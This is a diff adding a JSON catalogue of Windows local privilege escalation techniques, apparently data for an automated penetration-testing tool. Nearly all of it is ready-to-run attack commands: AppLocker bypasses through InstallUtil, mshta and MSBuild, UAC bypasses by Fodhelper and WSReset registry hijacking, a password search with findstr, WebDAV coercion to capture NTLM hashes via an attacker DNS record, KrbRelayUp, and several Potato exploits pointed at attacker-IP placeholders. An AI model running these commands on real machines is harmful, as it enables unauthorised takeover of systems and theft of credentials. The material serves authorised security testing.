@@ -1,0 +1,229 @@
+{
+  "service": "windows-privesc",
+  "description": "Local privilege escalation techniques on Windows from low-privileged user to SYSTEM/Administrator",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "privesc-applocker-bypass",
+      "name": "AppLocker Bypass",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Bypass AppLocker application whitelisting restrictions",
+      "commands": [
+        {
+          "tool": "Get-ChildItem",
+          "command": "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe",
+          "description": "Enumerate AppLocker policies"
+        },
+        {
+          "tool": "installutil.exe",
+          "command": "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
+          "description": "Execute via InstallUtil bypass"
+        },
+        {
+          "tool": "mshta.exe",
+          "command": "mshta.exe my.hta",
+          "description": "Execute HTA file"
+        },
+        {
+          "tool": "MsBuild.exe",
+          "command": "MsBuild.exe pshell.xml",
+          "description": "Execute via MSBuild"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "privesc-uac-bypass-fodhelper",
+      "name": "UAC Bypass via Fodhelper",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Bypass User Account Control using Fodhelper registry hijacking",
+      "commands": [
+        {
+          "tool": "Fodhelper.exe",
+          "command": "REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f && Fodhelper.exe",
+          "description": "UAC bypass via Fodhelper"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-uac-bypass-wsreset",
+      "name": "UAC Bypass via WSReset",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Bypass User Account Control using WSReset registry hijacking",
+      "commands": [
+        {
+          "tool": "wsreset.exe",
+          "command": "REG ADD HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command /f && wsreset.exe",
+          "description": "UAC bypass via WSReset"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-uac-bypass-msdt",
+      "name": "UAC Bypass via MSDT",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Bypass User Account Control using Microsoft Diagnostics Tool",
+      "commands": [
+        {
+          "tool": "msdt.exe",
+          "command": "msdt.exe -path <malicious_diagcab>",
+          "description": "UAC bypass via MSDT"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-auto-enum-winpeas",
+      "name": "Automated Privilege Escalation Enumeration (WinPEAS)",
+      "phase": "reconnaissance",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Comprehensive automated enumeration of privilege escalation vectors",
+      "commands": [
+        {
+          "tool": "winPEASany_ofs.exe",
+          "command": "winPEASany_ofs.exe",
+          "description": "Run WinPEAS enumeration"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    },
+    {
+      "id": "privesc-auto-enum-privesccheck",
+      "name": "Automated Privilege Escalation Check (PowerShell)",
+      "phase": "reconnaissance",
+      "prerequisites": ["low_privilege_access"],
+      "description": "PowerShell-based privilege escalation enumeration",
+      "commands": [
+        {
+          "tool": "PrivescCheck.ps1",
+          "command": ".\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended",
+          "description": "Run PrivescCheck enumeration"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    },
+    {
+      "id": "privesc-search-credentials",
+      "name": "Search Files for Credentials",
+      "phase": "credential_access",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Search common file types for hardcoded credentials and sensitive information",
+      "commands": [
+        {
+          "tool": "findstr",
+          "command": "findstr /si 'pass' *.txt *.xml *.docx *.ini",
+          "description": "Search files for password strings"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "privesc-webdav-coerce",
+      "name": "WebDAV Coercion from Low Privilege",
+      "phase": "credential_access",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Trigger WebDAV coercion by opening .searchConnector-ms file to capture NTLM hash",
+      "commands": [
+        {
+          "tool": "dnstool.py",
+          "command": "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
+          "description": "Add DNS record for attacker"
+        },
+        {
+          "tool": "searchConnector-ms",
+          "command": "Open malicious .searchConnector-ms file pointing to attacker@80/random.txt",
+          "description": "Trigger WebDAV coercion"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "privesc-krbrelayup",
+      "name": "KrbRelayUp Local Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Abuse Kerberos relay and RBCD for local privilege escalation to SYSTEM",
+      "commands": [
+        {
+          "tool": "KrbRelayUp.exe",
+          "command": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
+          "description": "Setup Kerberos relay"
+        },
+        {
+          "tool": "KrbRelayUp.exe",
+          "command": "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>",
+          "description": "Spawn SYSTEM shell via RBCD"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-potato-roguepotato",
+      "name": "RoguePotato Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["service_account", "seimpersonate"],
+      "description": "Exploit SeImpersonatePrivilege using RoguePotato for SYSTEM access",
+      "commands": [
+        {
+          "tool": "RoguePotato.exe",
+          "command": "RoguePotato.exe -r <attacker_ip> -e \"cmd.exe\" -l 9999",
+          "description": "Escalate to SYSTEM via RoguePotato"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-potato-godpotato",
+      "name": "GodPotato Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["service_account", "seimpersonate"],
+      "description": "Exploit SeImpersonatePrivilege using GodPotato for SYSTEM access",
+      "commands": [
+        {
+          "tool": "GodPotato.exe",
+          "command": "GodPotato.exe -cmd \"cmd /c <command>\"",
+          "description": "Escalate to SYSTEM via GodPotato"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-potato-printspoofer",
+      "name": "PrintSpoofer Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["service_account", "seimpersonate"],
+      "description": "Exploit SeImpersonatePrivilege via Print Spooler for SYSTEM access",
+      "commands": [
+        {
+          "tool": "PrintSpoofer.exe",
+          "command": "PrintSpoofer.exe -i -c cmd",
+          "description": "Escalate to SYSTEM via PrintSpoofer"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "privesc-potato-remotepotato",
+      "name": "RemotePotato0 Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["service_account", "seimpersonate"],
+      "description": "Exploit SeImpersonatePrivilege using RemotePotato0 for SYSTEM access",
+      "commands": [
+        {
+          "tool": "RemotePotato0.exe",
+          "command": "RemotePotato0.exe -m 2 -r <attacker_ip> -x <attacker_ip> -p 9999 -s 1",
+          "description": "Escalate to SYSTEM via RemotePotato0"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    }
+  ]
+}
